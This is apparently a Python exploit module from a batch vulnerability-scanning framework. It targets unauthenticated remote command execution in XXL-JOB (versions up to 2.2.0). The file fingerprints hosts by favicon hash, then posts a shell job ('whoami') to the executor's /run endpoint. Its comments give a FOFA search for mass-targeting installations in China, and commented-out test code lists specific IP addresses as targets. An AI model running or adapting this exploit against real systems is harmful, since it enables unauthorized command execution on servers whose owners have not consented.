# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

import hashlib
import time
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="XXL-JOB" && country="CN"
# python batch.py -m exploit.web.XXLJob.unauth_rce -cs -fs "app=\"XXL-JOB\" && country=\"CN\""

class Script(BaseScript):
    name = 'XXL-Job'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/run']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = '''        
        # xxl-job未授权加命令执行漏洞支持 =<v2.2.0版本
        # 支持脚本语言有Shell、Python、NodeJS、PHP、PowerShell
        # windows推荐使用PowerShell,Linux推荐使用shell
        # 如果不行可尝试其它方式，前提是环境支持
        '''
        self.favicon = ['421c7c35244591f892496fe4d6e51921']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('XXL-Job Finger', url))
                                    return {'name': 'XXL-Job Finger', 'url': url, 'software': 'XXL-Job'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    times = round(time.time() * 1000)
                    headers = {'X-Requested-With': 'XMLHttpRequest',
                               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'Accept-Encoding': 'gzip, deflate'}
                    data = '''{
                      "jobId": 1,
                      "executorHandler": "demoJobHandler",
                      "executorParams": "demoJobHandler",
                      "executorBlockStrategy": "COVER_EARLY",
                      "executorTimeout": 0,
                      "logId": 1,
                      "logDateTime": 1586629003729,
                      "glueType": "GLUE_SHELL",
                      "glueSource": "whoami",
                      "glueUpdatetime":''' + str(times) + ''',
                      "broadcastIndex": 0,
                      "broadcastTotal": 0
                    }'''
                    async with session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            await asyncio.sleep(2)
                            tqdm.write(Fore.RED + '[{}] {}'.format('XXL-job RCE', url))
                            return {'name': 'XXL-job RCE', 'url': url, 'software': 'XXL-job'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://8.142.121.186:8080/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
